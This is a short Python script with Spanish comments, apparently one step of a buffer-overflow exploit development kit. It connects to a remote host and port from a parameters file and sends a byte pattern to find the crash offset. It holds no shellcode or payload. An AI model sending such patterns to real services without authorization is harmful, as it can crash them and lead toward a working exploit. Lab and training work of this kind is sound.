#!/usr/bin/python3
import socket, sys
from parameters import rhost, rport, timeout, pattern
from colors import colors

try:
    # conexión
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((rhost, rport))
    s.recv(1024)

    print(colors.Green + '\nEnviando pattern de %s bytes...' % len(pattern) + colors.End)

    # pattern
    s.send(pattern + b'\r\n')
    s.recv(1024)

except Exception as error:
    print(colors.Red + '\n[!] Ha ocurrido un error:', str(error) + colors.End)
    sys.exit(0)
    
finally:
    # cierre de conexión
    s.close()